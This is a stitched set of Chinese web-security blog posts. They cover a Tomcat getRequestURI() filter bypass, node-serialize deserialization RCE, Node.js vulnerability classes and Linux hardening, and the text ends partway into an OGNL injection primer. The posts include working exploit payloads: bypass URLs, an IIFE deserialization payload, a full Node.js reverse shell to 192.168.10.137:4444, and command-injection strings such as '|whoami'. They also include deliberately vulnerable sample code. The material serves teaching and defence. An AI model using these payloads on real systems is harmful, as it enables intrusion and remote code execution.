getRequestURI()的处理我们直接在index.jsp中调用getRequestURI()函数的地方打上断点调试即可。 这里是直接调用Request.requestURI()函数然后直接返回其字符串值： 跟进Request.requestURI()函数，这里是直接返回请求的URL内容，没有做任何处理以及URL解码： getRequestURL()的处理在getRequestURL()函数中是调用了Request.getRequestURL()函数的： 跟进该函数，在提取了协议类型、host和port之后，调用了getRequestURI()函数获取URL请求的路径，然后直接拼接进URL直接返回而不做包括URL解码的任何处理： getServletPath()的处理在getServletPath()函数中是调用了Request.getServletPath()函数的： 跟进去，看到是直接返回前面Tomcat已经处理过后的提取处理的Servlet路径，注意这里是获取MappingData类对象中的wrapperPath属性值： getPathInfo()的处理和getServletPath()函数的处理是一样的，同样是返回前面经过Tomcat解析处理后的MappingData类对象中其中一个属性值，这里是获取的pathInfo属性值并直接返回： getContextPath()的处理在getContextPath()函数中，调用了Request.getContextPath()函数： 跟进该函数，先是调用getServletContext().getContextPath()来获取当前Servlet上下文路径以及调用getRequestURI()函数获取当前请求的目录路径： 往下的这段循环是处理uri变量值中如果存在多个连续的/则删除掉： 再往下，获取下一个/符号的位置，然后根据该位置索引对uri变量值进行工程名的切分提取： 接着，就是对刚刚切分得到的candidate变量进行和Tomcat一样的特殊字符处理过程，先调用removePathParameters()处理;和.，然后进行URL解码，再调用normalize()函数进行标准化处理，处理过后比较处理完的candidate变量值和之前获取的规范上下文路径是否一致，不一致的话就循环继续前面的操作直至一致为止： 最后，直接返回按pos索引切分的uri变量值： 0x04 攻击利用看个访问限制绕过的场景。 假设Tomcat上启动的Web目录下存在一个info目录，其中有一个secret.jsp文件，其中包含敏感信息等： 123456789101112&lt;%@ page contentType=\"text/html;charset=UTF-8\" language=\"java\" %&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;Secret&lt;/title&gt;&lt;/head&gt;&lt;body&gt;username: mi1k7ea&lt;br&gt;password: 123456&lt;br&gt;address: china&lt;br&gt;phone: 13666666666&lt;br&gt;&lt;/body&gt;&lt;/html&gt; 新建一个filter包，其中新建一个testFilter类，实现Filter接口类： 1234567891011121314151617181920212223242526272829303132package filter;import javax.servlet.*;import javax.servlet.http.*;import java.io.IOException;public class testFilter implements Filter &#123; @Override public void init(FilterConfig filterConfig) throws ServletException &#123; &#125; @Override public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException &#123; HttpServletRequest httpServletRequest = (HttpServletRequest)servletRequest; HttpServletResponse httpServletResponse = (HttpServletResponse)servletResponse; String url = httpServletRequest.getRequestURI(); if (url.startsWith(\"/urltest/info\")) &#123; httpServletResponse.getWriter().write(\"No Permission.\"); return; &#125; filterChain.doFilter(servletRequest, servletResponse); &#125; @Override public void destroy() &#123; &#125;&#125; 这个Filter作用是：只要访问/urltest/info目录下的资源，都需要进行权限判断，否则直接放行。可以看到，这里调用getRequestURI()函数来获取请求中的URL目录路径，然后调用startsWith()函数判断是否是访问的敏感目录，若是则返回无权限的响应。当然这里写得非常简单，只做演示用。 编辑web.xml，添加testFilter设置： 1234567891011121314&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;web-app xmlns=\"http://xmlns.jcp.org/xml/ns/javaee\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd\" version=\"4.0\"&gt; &lt;filter&gt; &lt;filter-name&gt;testFilter&lt;/filter-name&gt; &lt;filter-class&gt;filter.testFilter&lt;/filter-class&gt; &lt;/filter&gt; &lt;filter-mapping&gt; &lt;filter-name&gt;testFilter&lt;/filter-name&gt; &lt;url-pattern&gt;/*&lt;/url-pattern&gt; &lt;/filter-mapping&gt;&lt;/web-app&gt; 运行之后，访问http://localhost:8080/urltest/info/secret.jsp，会显示无权限： 根据前面的分析构造如下几个payload都能成功绕过认证限制来访问： 123http://localhost:8080/urltest/./info/secret.jsphttp://localhost:8080/urltest/;mi1k7ea/info/secret.jsphttp://localhost:8080/urltest/mi1k7ea/../info/secret.jsp 整个的过程大致如此，就是利用解析的差异性来绕过认证。 在前段时间爆出的Apache Shiro的CVE中，就是使用getRequestURI()函数导致的，这里可以看到人家的补丁是怎么打的，其实就是用getPathInfo()替换掉就OK了：https://github.com/apache/shiro/commit/3708d7907016bf2fa12691dff6ff0def1249b8ce 0x05 参考getRequestURI()带来的安全问题","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"},{"name":"Java","slug":"Java","permalink":"https://www.mi1k7ea.com/tags/Java/"},{"name":"Tomcat","slug":"Tomcat","permalink":"https://www.mi1k7ea.com/tags/Tomcat/"}]},{"title":"node-serialize反序列化漏洞","date":"2020-03-29T15:05:59.000Z","path":"2020/03/29/node-serialize反序列化漏洞/","text":"0x01 简介Node.js在node-serialize模块中存在反序列化漏洞，若unserialize()函数参数外部可控，则通过IIFE（Immediately Invoked Function Expression）可以实现RCE。 0x02 环境搭建需要安装node-serialize模块： 1npm install node-serialize 0x03 序列化序列化代码如下，serialize.js： 1234567var y = &#123; function()&#123; require('child_process').exec('calc', function(error, stdout, stderr)&#123; console.log(stdout) &#125;); &#125;&#125;var s = require('node-serialize');console.log(\"Serialized:\\n\" + s.serialize(y)); 变量y是一段payload，用于启动一个子线程来执行calc命令，这里输出序列化后的内容： 123E:\\&gt;node serialize.jsSerialized:&#123;&quot;function&quot;:&quot;_$$ND_FUNC$$_function()&#123;\\r\\n\\t\\trequire(&apos;child_process&apos;).exec(&apos;calc&apos;, function(error, stdout, stderr)&#123; console.log(stdout) &#125;);\\r\\n\\t&#125;&quot;&#125; 0x04 IIFE前面得到了序列化的字符串之后，就可以用unserialize()函数进行反序列化了。那么问题来了，怎么代码执行呢？这就用到了JavaScript的IIFE了。 IIFE（Immediately Invoked Function Expression）立即调用的函数表达式，即声明函数的同时立即调用该函数，目的是为了隔离作用域，防止污染全局命名空间。 IIFE一般有如下两种写法： 12(function()&#123; /* code /* &#125;());(function()&#123; /* code /* &#125;)(); 有时，我们需要在定义函数之后，立即调用该函数。此时，你不能再函数的定义之后加上圆括号，这是因为会产生语法错误，错误原因是function这个关键字既可以当作语句，也可以当作表达式。为了避免其余，规定function关键字出现在行首时，解释为语句。因此，若是以function开头的代码则必须像前面一样的写法才能成功在定义时被当作表达式执行。 写下Demo试下，下面两种形式都能成功弹计算器： 1234567(function() &#123; require('child_process').exec('calc', function(error, stdout, stderr)&#123; console.log(stdout) &#125;);&#125;());// 或(function() &#123; require('child_process').exec('calc', function(error, stdout, stderr)&#123; console.log(stdout) &#125;);&#125;)(); 在前面序列化的代码serialize.js中，要想在序列化时直接执行该函数，可以将代码修改如下： 1234567var y = &#123; poc : function()&#123; require('child_process').exec('calc', function(error, stdout, stderr)&#123; console.log(stdout) &#125;); &#125;()&#125;var s = require('node-serialize');console.log(\"Serialized:\\n\" + s.serialize(y)); 0x05 反序列化触发RCE前面序列化得到如下内容： 1&#123;&quot;function&quot;:&quot;_$$ND_FUNC$$_function()&#123;\\r\\n\\t\\trequire(&apos;child_process&apos;).exec(&apos;calc&apos;, function(error, stdout, stderr)&#123; console.log(stdout) &#125;);\\r\\n\\t&#125;&quot;&#125; 在此基础上，为了在服务端进行反序列化操作的时候能触发RCE，我们直接在函数定义的后面追加()来构造即可（为啥能这么构造后面会说到）： 1&#123;&quot;function&quot;:&quot;_$$ND_FUNC$$_function()&#123;\\r\\n\\t\\trequire(&apos;child_process&apos;).exec(&apos;calc&apos;, function(error, stdout, stderr)&#123; console.log(stdout) &#125;);\\r\\n\\t&#125;()&quot;&#125; 反序列化代码如下，unserialize.js： 12345var s = require('node-serialize');var payload = '&#123;\"function\":\"_$$ND_FUNC$$_function()&#123;\\\\r\\\\n\\\\t\\\\trequire(\\'child_process\\').exec(\\'calc\\', function(error, stdout, stderr)&#123; console.log(stdout) &#125;);\\\\r\\\\n\\\\t&#125;()\"&#125;'s.unserialize(payload); 运行即可触发RCE弹计算器： 0x06 漏洞分析我们看源码，位于NodeJS\\node_modules\\node-serialize\\lib\\serialize.js，其中反序列化相关的代码如下： 这里当解析到将要反序列化的内容中的键值为string类型时，判断是否包含FUNCFLAG变量值即_$$ND_FUNC$$_，在前面的代码中有定义，该值表明其中的内容是个函数： 回到前面的if判断条件中往下走，若是则调用76行中的eval()方法来执行其中的语句。同时，由于JS的IIFE，使得刚刚定义的恶意函数就能够马上得以执行，从而RCE。 有个疑问，为啥这里不需要向前面IIFE小节中说的给function定义加()使其不是function开头呢？我们看到eval()那行代码： 明显看到，它已经给我们的整个的function给加上了括号括起来，我们只需要在函数定义后面加上()即可满足IIFE的其中一种格式，从而成功RCE。 0x07 参考利用 Node.js 反序列化漏洞远程执行代码","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"},{"name":"JavaScript","slug":"JavaScript","permalink":"https://www.mi1k7ea.com/tags/JavaScript/"},{"name":"Node.js","slug":"Node-js","permalink":"https://www.mi1k7ea.com/tags/Node-js/"}]},{"title":"浅析Node.js安全","date":"2020-03-29T04:17:06.000Z","path":"2020/03/29/浅析Node-js安全/","text":"0x01 基本概念简介Node.js是一个基于Chrome V8引擎的JavaScript运行环境。Node.js使用了一个事件驱动、非阻塞式I/O的模型。 Node是一个让JavaScript运行在服务端的开发平台，它让JavaScript成为与PHP、Python、Perl、Ruby等服务端语言平起平坐的脚本语言。实质是对Chrome V8引擎进行了封装。 Node对一些特殊用例进行优化，提供替代的API，使得V8在非浏览器环境下运行得更好。V8引擎执行Javascript的速度非常快，性能非常好。Node是一个基于Chrome JavaScript运行时建立的平台， 用于方便地搭建响应速度快、易于扩展的网络应用。Node 使用事件驱动， 非阻塞I/O 模型而得以轻量和高效，非常适合在分布式设备上运行数据密集型的实时应用。 环境安装、基础语法与特性参考：https://www.runoob.com/nodejs/nodejs-tutorial.html 第一个应用Node.js应用由以下三部分组成： 引入required模块：我们可以使用require指令来载入Node.js模块。 创建服务器：服务器可以监听客户端的请求，类似于Apache、Nginx等HTTP服务器。 接收请求与响应请求：服务器很容易创建，客户端可以使用浏览器或终端发送HTTP请求，服务器接收请求后返回响应数据。 直接看下代码实现，test.js： 1234567891011121314151617// 引入required模块var http = require('http');// 创建服务器http.createServer(function (request, response) &#123; // 发送 HTTP 头部 // HTTP 状态值: 200 : OK // 内容类型: text/plain response.writeHead(200, &#123;'Content-Type': 'text/plain'&#125;); // 发送响应数据 \"Mi1k7ea\" response.end('Mi1k7ea\\n');&#125;).listen(666);// 终端打印如下信息console.log('Server running at http://127.0.0.1:666/'); 直接用node命令运行即可： Express框架Express是一个简洁而灵活的Node.js Web应用框架，提供了一系列强大特性帮助你创建各种Web应用，和丰富的HTTP工具。 使用Express可以快速地搭建一个完整功能的网站。 Express框架核心特性： 可以设置中间件来响应HTTP请求。 定义了路由表用于执行不同的HTTP请求动作。 可以通过向模板传递参数来动态渲染HTML页面。 Express的安装： 1234npm install express --savenpm install body-parser --savenpm install cookie-parser --savenpm install multer --save 以上命令会将Express框架以及几个重要的模块一起安装在node_modules目录中，node_modules目录下会自动创建express目录。几个重要的模块介绍如下： body-parser - node.js 中间件，用于处理 JSON, Raw, Text 和 URL 编码的数据。 cookie-parser - 这就是一个解析Cookie的工具。通过req.cookies可以取到传过来的cookie，并把它们转成对象。 multer - node.js 中间件，用于处理 enctype=”multipart/form-data”（设置表单的MIME编码）的表单数据。 安装完后，我们可以查看下express使用的版本号： 123E:\\&gt;npm list expressE:\\`-- express@4.17.1 Demo应用，express_demo.js： 123456789101112131415var express = require('express');var app = express(); app.get('/', function (req, res) &#123; res.send('Express Test');&#125;) var server = app.listen(8888, function () &#123; var host = server.address().address var port = server.address().port console.log(\"应用实例，访问地址为 http://%s:%s\", host, port) &#125;) 接着用命令node express_demo.js运行即可访问。 在页面中访问，可以看到响应报文中有个X-Powered-By头，其值为Express，也就是说，在日常的抓包中看到该头字段即可知道是使用的Node.js的Express框架： 0x02 Node.js安全Node.js中的Web安全问题和传统的Web安全问题都是一样的，只是代码实现上有语法的差异而已。 代码注入Node.js同样存在代码注入问题，需要重点关注eval、setInteval、setTimeout、new Function等函数的参数是否外部可控。 示例代码如下： 1234567891011121314var express = require('express');var app = express();var port = 8181;app.get('/', function (req, res) &#123; var a = eval(req.query.a); var b = eval(req.query.b); var r = a + b; res.send('Sum a+b=' + r);&#125;)console.log(\"App is listening on port: \" + port);app.listen(port); 强制应用退出的payload如下，执行之后Express服务就终止了： 1?a=1&amp;b=process.exit() 再深入利用，反弹shell的payload如下： 12345678910111213function rev(host,port)&#123; var net = require('net'); var cp = require('child_process'); var cmd = cp.spawn('cmd.exe', []); var client = new net.Socket(); client.connect(port, host, function()&#123; client.write('Connected\\r\\n'); client.pipe(cmd.stdin); cmd.stdout.pipe(client); cmd.stderr.pipe(client); client.on( 'exit', function(code,signal)&#123; client.end('Disconnected\\r\\n'); &#125; ); client.on( 'error',function(e)&#123; setTimeout( rev(host,port), 5000); &#125;) &#125;);&#125;;rev('192.168.10.137', 4444); 直接注入访问： 在Kali中成功拿到反弹shell： 命令注入Node.js同样存在命名注入漏洞，需重点关注模块child_process的函数，因为这个模块包含了创建一个新进程来执行系统命令的功能。 示例代码如下，直接使用外部参数拼接ping命令： 1234567891011121314var express = require('express');var cmd = require('child_process');var app = express();var port = 8181;app.get('/', function (req, res) &#123; cmd.exec(\"ping -n 4 \" + req.query.ip,function(err,data)&#123; res.send('Ping Results: &lt;pre&gt;' + data + '&lt;/pre&gt;'); &#125;)&#125;)console.log(\"App is listening on port: \" + port);app.listen(port); 正常访问： 尝试进行命令注入： 12?ip=|whoami?ip=127.0.0.1||whoami XSSNode.js本身没有XSS防护机制，也不像Java那样拥有强大的过滤器来实现过滤用户的有害输入从而防御XSS。若是未经过滤直接显示外部的输入则导致XSS。但是可以通过设置HTTP头中加入X-XSS-Protection在浏览器端缓解XSS。 示例代码如下： 1234567891011var express = require('express');var app = express();var port = 8181;app.get('/', function (req, res) &#123; res.send('Hello, ' + req.query.name);&#125;)console.log(\"App is listening on port: \" + port);app.listen(port); 直接注入XSS payload即可： SSRFNode.js的needle模块可发起GET/POST等HTTP请求，当其参数外部可控时可造成SSRF漏洞。 示例代码如下： 123456789101112131415161718var express = require('express');var app = express();var needle = require('needle');var port = 8181;app.get('/', function (req, res) &#123; var url = req.query['url']; needle.get(url, function(error, response) &#123; if (!error &amp;&amp; response.statusCode == 200) res.send(response.body); &#125;); console.log('new request:' + url);&#125;)console.log(\"App is listening on port: \" + port);app.listen(port); HTTP参数污染Node.js有一个奇怪的特性，即允许一个参数有多个值。假设有一个参数叫做name，我们给这个参数传递了多个值，最终name参数将包含这两个值，两个值之间用逗号隔开。该特性可用来进行参数解析漏洞的利用。 示例代码如下： 123456789101112var express = require('express');var app = express();var port = 8181;app.get('/', function (req, res) &#123; var name = req.query.name; res.send(\"Name: \" + name);&#125;);console.log(\"App is listening on port: \" + port);app.listen(port); SQL注入 Node.js的网站注入漏洞很少。Node.js通常与mysql/mongodb搭配使用，因为sql注入的漏洞危害很高并且存在多年了，一些新出现的语言如openresty+lua/node.js等天生会规避掉这种安全问题。它们通常都采用了占位符或者叫参数化查询来与数据库交互。node.js 原生的与数据库交互代码如下： 123456789101112var mysql = require ('mysql') ; var connection = mysql .createConnection(&#123; host: 'localhost', user: 'root', password: 'root',port: '3306', database: 'admin', &#125;) ; connection.connect( ); var sql = 'select * from admin where id =?''; Var param=[1];connection.query( sql，param); connection.end( ); Node.js现在已经有了orm框架（比如Sequelize），因此注入漏洞就跟少了。但是如果程序员写代码时不小心用了字符串拼接，还是会造成sql注入的。如下： 1select * from admin where id=$id 文件上传 Node.js的网站由于特有的路由规则，它的的上传问题虽然不像php、jsp、asp等脚本语言，若攻击者上传若未经过滤的脚本，便可轻松的拿到shel。但是代码中若存在路径跳转漏洞，攻击者可以直接将shell脚本木马上传到/etc/rc.d等启动项下面,或者是直接上传相应的index.js文件覆盖到第三方模块express等目录下，通过精心构造的js文件也能实现命令执行的目的。 文件上传示例代码如下： 123456789101112131415161718192021222324252627282930var express = require('express');var app = express();var fs = require('fs');var multer = require('multer');app.use(multer(&#123; dest: 'E:/'&#125;).array('image'));app.use(express.static('public'));var port = 8181;app.post('/', function (req, res) &#123; console.log(req.files[0]); // 上传的文件信息 var des_file = __dirname + '/' + req.files[0].originalname; fs.readFile( req.files[0].path, function (err, data) &#123; fs.writeFile(des_file, data, function (err) &#123; if( err )&#123; console.log( err ); &#125;else&#123; response = &#123; message:'File uploaded successfully', filename:req.files[0].originalname &#125;; &#125; console.log( response ); res.end( JSON.stringify( response ) ); &#125;); &#125;);&#125;);console.log(\"App is listening on port: \" + port);app.listen(port); uploadfile.html： 12345678910111213&lt;html&gt;&lt;head&gt;&lt;title&gt;File&lt;/title&gt;&lt;/head&gt;&lt;body&gt;Upload File: &lt;br&gt;&lt;form action=\"http://127.0.0.1:8181/\" method=\"post\" enctype=\"multipart/form-data\"&gt;&lt;input type=\"file\" name=\"image\" size=\"50\" /&gt;&lt;br&gt;&lt;input type=\"submit\" value=\"upload\" /&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt; 上传文件示例： NPM 任何人都可以创建模块发布到npm上，供别人调用，虽然这为开发者带来了一定的便利性，但必然隐藏着安全隐患，假如一不小心使用了不安全的第三方模块后果可想而知了，比如前段时间闹得沸沸扬扬的node-serialize模块所引起的远程代码执行漏洞（cve-2017-5914）。现在有一款NSP 工具可以帮助检查第三方模块现有漏洞。 12npm i nsp –g //安装nspnsp check 要检查的package.json //检查是否有漏洞 反序列化漏洞可参考：《node-serialize反序列化漏洞》。 0x03 工具参考：https://github.com/ajinabraham/NodeJsScan 0x04 参考浅谈Node.js Web的安全问题 渗透测试 Node.js 应用 实战教你如何利用NodeJS 漏洞？ An Introduction to Penetration Testing Node.js Applications","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"},{"name":"JavaScript","slug":"JavaScript","permalink":"https://www.mi1k7ea.com/tags/JavaScript/"},{"name":"Node.js","slug":"Node-js","permalink":"https://www.mi1k7ea.com/tags/Node-js/"}]},{"title":"Linux安全笔记","date":"2020-03-28T13:33:27.000Z","path":"2020/03/28/Linux安全笔记/","text":"0x00 前言Linux中一些基础安全问题的排查笔记。 0x01 已知CVE漏洞Linux最大的安全问题就是自带的重要组件及内核存在已知CVE漏洞。 对于Linux Server，可查询供应商的补丁版本情况，与被测版本进行对比。 对于嵌入式Linux，可及时跟踪cvedetails网站，关注kernel、glibc、openssl、bash、openssh等重要组件的CVE漏洞情况。 0x02 进程权限管理业务进程以root权限运行用ps命令列出Linux中所有进程信息，逐个确认以root权限运行的进程是否为必要的，应尽量满足最小权限原则。 业务进程以root启动但使用seteuid进行伪装在Linux下有4个UID：RUID（real user id，实际用户ID）、EUID（effective user id，有效用户ID）、SUID（saved user id，保存的设置用户ID）、SUID（set user id），其具体区别如下： RUID，用于在系统中标识一个用户是谁，当用户使用用户名和密码成功登录后一个Linux系统后就唯一确定了他的RUID； EUID，用于系统决定用户对系统资源的访问权限，通常情况下等于RUID； SUID（set user id），用于对外权限的开放。跟RUID及EUID是用一个用户绑定不同，它是跟文件而不是跟用户绑定； saved uid，这个实际上是一个虚拟概念，其对应的实际上还是RUID和SUID，只是在不同身份之间切换时变成对应的值； 在Linux中设置uid的几个函数如下。 int setuid(uid_t uid) ： 若进程具有超级用户权限，则setuid将实际用户ID、有效用户ID及保存的设置用户ID设置为uid 若进程没有超级用户权限，但是uid等于实际用户ID或保存的设置用户ID，则setuid只将有效用户ID设置为uid int seteuid(uid_t uid) ： 若进程具有超级用户权限，则setuid只将有效用户ID设置为uid 若进程没有超级用户权限，则setuid只将有效用户ID设置为uid，但是uid必须等于实际用户ID或保存的设置用户ID int setreuid(uid_t ruid, uid_t euid) ： 针对设置用户ID位的程序: 交换有效用户ID和保存的设置用户ID 针对没有设置用户ID位的程序: 交换有效用户ID和实际用户ID setuid()与seteuid()的区别 setuid()用来重新设置执行目前进程的用户识别码。不过，要让此函数有作用，其有效的用户识别码必须为0(root)。在Linux下，当root使用setuid()来变换成其他用户识别码时，root权限会被抛弃，完全转换成该用户身份。也就是说，该进程往后将不再具有可setuid()的权利，如果只是向暂时抛弃root 权限，稍后想重新取回权限，则必须使用seteuid()。 问题场景 某些场景下，在启动业务进程时，以root用户运行，但在初始化结束后调用seteuid降为普通用户，使用ps命令查看时对应的进程用户显示为普通用户。但是，此时业务进程可以在任何时候调用seteuid切换为root用户。 这种情况尤为需要警惕，因为业务进程实际上是具备root权限的，只是使用seteuid进行伪装而已。 排查方法：使用IDA打开业务进程对应的二进制文件（含所依赖的动态库），查看其中是否存在调用seteuid，若有则表示进行在运行中会随时切换用户。 0x03 文件访问权限系统存在未授权的suid权限的程序在Linux中，SUID是Set User ID，SGID是Set Group ID。suid意味着如果A用户对属于他自己的shell脚本文件设置了这种权限，那么其他用户在执行这个脚本的时候就拥有了A用户的权限。所以，如果root用户对某一脚本设置了这一权限的话则其他用户执行该脚本的时候则拥有了root用户权限。同理，guid意味着执行相应脚本的用户则拥有了该文件所属用户组中用户的权限。 系统会自带一些具备suid权限位的程序，特征就是代表execute权限位的”x”为”s”，例子： 123ski12@ubuntu:~$ ls -l /usr/bin/passwd -rwsr-xr-x 1 root root 54256 May 16 2017 /usr/bin/passwdski12@ubuntu:~$ 若一个二进制文件本来无可执行权限，却又被增加了suid权限位，对应的execute权限位就是大写的”S”，出现这种情况一般是文件权限设定错误，在文件没有可执行权限时，没有危害，但还是需要去除suid权限位。 需要关注的是那些无需suid权限位的二进制文件被设置了suid权限，可以使用find命令将系统中属主为root的suid权限的文件找出来，逐个确认： 1find / -type f -user root -perm -4000 -print 同样的，具备sgid权限的二进制文件，表示在执行过程中会获取二进制文件所属group权限，查找命令如下，对列出的文件逐个确认即可： 1find / -type f -perm -2000 -print 属主为普通用户的二进制文件被root执行若属主为普通用户的文件或普通用户具有写权限的文件，当root在某些场景下会自发运行该可执行文件时，如果普通用户往文件内容中插入恶意代码，则会造成提权等安全问题。 另外，Crontab定时任务所执行的脚本或命令同样是需要重点排查的对象。 普通用户拥有设备文件的读写权限除了/dev/zero、/dev/random、/dev/null等一些公用设备，大部分设备普通用户是不能有读写权限的，具体情况具体分析。 0x04 用户管理用户口令安全建议系统及相关组件服务的用户口令至少满足如下要求： 口令长度&gt;=6个字符； 口令必须至少包含一个大写字母、小写字母和数字； 口令不能是连续的数字或同样的字母； 口令不能和账号明显关联； 排查方法： 查看系统的密码复杂度设置； 修改用户密码，检测是否校验旧密码，是否对新密码进行复杂度校验； 普通用户具有过多权限普通用户具备过多权限会引起越权问题，如在管理群组中uid为0等。 排查方法： 查看系统/etc/passwd文件中的用户定义，是否存在多个uid为0的用户； 查看/etc/group文件，root组中是否包含多余用户； sudo配置错误导致普通用户可提权执行任意命令sudo用于以另一用户的身份执行指定的命令，可执行的命令在sudoer配置文件中指定。由于配置疏忽，提供了一些通用命令，攻击者可以利用这些通用命令进行组合，越权更改系统配置文件。另一个错误点为指定的命令是一个脚本，而普通用户具备该脚本的权限，从而执行任意命令。 通过查看sudo配置文件是否包含targetpw来排查： 1grep targetpw /etc/sudoers 如果无输出，或者输出的行以#开头，则表示启用了sudo。接着执行visudo命令，查看其中的命令列表是否存在cp、chmod等通用命令。 对于命令列表中的脚本，进一步排查脚本的属主和读写权限，要求属主是root，并且group和others无写权限。 0x05 命令逃逸shell逃逸如果在应用了具备执行外部shell命令的工具，存在通过执行外部命令逃逸处应用的风险。 more命令逃逸!whoami能逃逸到shell执行whoami命令。 less命令逃逸!whoami能逃逸到shell执行whoami命令。 vi/vim命令逃逸!whoami能逃逸到shell执行whoami命令。 gdb命令逃逸shell whoami能逃逸到shell执行whoami命令。 自定义shell界面存在逃逸原理：有些自定义的产品在对用户展示信息时，有可能会调用外部的less、more等命令来实现的，若是这种场景则可能存在命令逃逸的风险。 排查方法：分析自定义的二进制文件所调用的system、exec、popen等函数的调用点，查看是否有执行具备外部逃逸命令行为的调用。 0x06 本地提权当使用root用户访问低权限用户的目录时，低权限用户可以更改此目录为符号链接，指向自己没有权限操作的位置，达到改写任意文件的目的。 除此之外，当root用户运行属主为低权限用户的脚本或者低权限用户拥有写权限的脚本时，同样存在本地提权问题。 具体可参考：https://www.halfdog.net/Security/2015/NtpCronjobUserNtpToRootPrivilegeEscalation/ 0x07 sysctlsysctl命令用于运行时配置内核参数，这些参数位于/proc/sys目录下。sysctl配置与显示在/proc/sys目录中的内核参数中。可以用sysctl来设置联网功能，如IP转发、源路由检查等。用户只需要编辑/etc/sysctl.conf文件即可手动或自动执行由sysctl控制的功能。 如下三种配置存在安全问题： 设置net.ipv4.ip_forward=1，使得Linux不同网卡间报文可以转发，导致三面不隔离； 设置net.ipv4.conf.all.accept_redirects = 1，使得Linux接收ICMP redirect报文，会被中间人攻击； 没有设置net.ipv4.tcp_syncookies为1，不能防御TCP SYN Flood攻击； 0x08 系统配置系统未做资源控制，普通用户消耗过多资源导致DoS原理：系统资源会因为外部操作而明显消耗，导致DoS。这些资源包括文件句柄、内存、CPU、最大进程数、登录会话数等。 排查方法： 分析外部接口，是否存在可被外部触发大量的资源消耗操作； 使用程序消耗大量系统资源，查看系统是否存在资源过载保护机制，正常业务是否明显受到影响，如用户无法登录、无法运行新进程等； iptables规则存在被绕过的错误配置由于iptables规则设计不完善，可导致被绕过。 比如，一个虚拟机br网桥安全组规则片段如下： 规则1，允许UDP报文通过，源端口是68，目的端口是67： 1-A neutron-openvswi-ofa960951-9 -p udp -m udp --sport 68 --dport 67 -j RETURN 规则2，目的IP是100.64.0.0/10的全部丢弃报文： 1-A neutron-openvswi-relay-cidr -d 100.64.0.0/10 -j DROP 规则3，检测目的MAC与IP是否绑定，没有绑定则直接丢弃报文： 12-A neutron-openvswi-s0bff551f-2 -s 192.168.0.15/32 -m mac --mac-source FA:16:3E:71:F1:DD -j RETURN-a neutron-openvswi-s0bff551f-2 -j DROP 上述安全组规则设计存在如下缺陷：由于规则2比规则1优先级低，恶意用户构造特殊报文会绕过目的IP为100.64.0.0某些协议的报文穿越到其他租户的VPC中，对不属于自己的虚拟机进行流量攻击，破坏VPC隔离性。 系统对外的文件共享（nfs、samba）配置不当执行exportfs -av命令，查看系统开启了哪些nfs共享并逐个确认。 查看/etc/samba/smb.conf，查看系统开启了哪些共享并逐个确认。 建议禁止用户利用ssh做端口转发ssh的端口转发功能会破坏网络隔离性，非必须的情况下建议默认禁止。 排查方法：查看/etc/ssh/ssh_config配置文件，确认端口转发功能是否已默认禁止，选项为AllowTcpForwarding。 口令保存在/etc/passwd中用户口令密文保存在/etc/passwd文件中，而不是/etc/shadow文件中。 /etc/passwd是全局可读的文件，若用户口令密文直接保存在该文件中将会导致用户密码可被工具暴力破解。 排查方法：直接查看/etc/passwd的内容是否存在用户口令密文。 0x09 日志审计日志文件可被普通用户修改日志文件用于审计，需要防止被普通用户修改。 排查方法：查看所有系统日志文件的访问权限，避免出现可被普通用户进行修改的权限。 日志目录未处于独立分区，日志过多会导致占满整个磁盘如题。 系统是否监听UDP 514端口，能接收网络上发来的日志信息对于非嵌入式Linux，开启了syslog服务后，会监听UDP 514端口，此时网络所发过来的日志都会被syslog记录，若日志量非常大时，会极大地消耗磁盘空间。 排查方法：netstat -an | grep 514 如果有监听，则查看syslog日志是否保存在独立分区中，或者日志是否有做轮转。 日志是否记录敏感信息查看系统日志，使用关键字查找日志文件，是否有session、密码、token、地址、号码等用户敏感信息。","tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.mi1k7ea.com/tags/Linux/"}]},{"title":"OGNL表达式注入漏洞总结","date":"2020-03-16T13:51:15.000Z","path":"2020/03/16/OGNL表达式注入漏洞总结/","text":"0x01 OGNL表达式基础OGNL简介OGNL全称Object-Graph Navigation Language即对象导航图语言，它是一种功能强大的表达式语言，通过它简单一致的表达式语法，可以存取对象的任意属性，调用对象的方法，遍历整个对象的结构图，实现字段类型转化等功能。它使用相同的表达式去存取对象的属性。这样可以更好的取得数据。 OGNL使用Java反射和内省来解决运行时应用程序的对象图。这允许程序根据对象图的状态改变行为，而不是依赖于编译时设置。它还允许更改对象图。 简单了解下Java内省机制： Java语言内省（Introspector）是Java语言对Bean类属性、事件的一种缺省处理方法。例如类A中有属性name,那我们可以通过getName,setName来得到其值或者设置新的值。通过getName/setName来访问name属性，这就是默认的规则。Java中提供了一套API用来访问某个属性的getter/setter方法，通过这些API可以使你不需要了解这个规则（但你最好还是要搞清楚），这些API存放于包java.beans中。 一般的做法是通过类Introspector来获取某个对象的BeanInfo信息，然后通过BeanInfo来获取属性的描述器（PropertyDescriptor），通过这个属性描述器就可以获取某个属性对应的getter/setter方法，然后我们就可以通过反射机制来调用这些方法。 OGNL可以让我们用非常简单的表达式访问对象层，例如，当前环境的根对象为user1，则表达式person.address[0].province可以访问到user1的person属性的第一个address的province属性。 webwork2和现在的Struts2.x中使用OGNL取代原来的EL来做界面数据绑定，所谓界面数据绑定，也就是把界面元素（例如一个textfield,hidden)和对象层某个类的某个属性绑定在一起，修改和显示自动同步。而Struts2框架正是因为滥用OGNL表达式，使之成为了“漏洞之王”。 OGNL表达式具有以下特点： 支持对象方法调用，如objName.methodName()； 支持类静态方法调用和值访问，表达式的格式为@[类全名（包括包路径）]@[方法名|值名]，如@java.lang.String@format(‘fruit%s’,’frt’)； 支持赋值操作和表达式串联，如price=100、discount=0.8，calculatePrice(price*discount)这个表达式会返回80； 访问OGNL上下文（OGNL context）和ActionContext； 操作集合对象； 可以直接new一个对象； 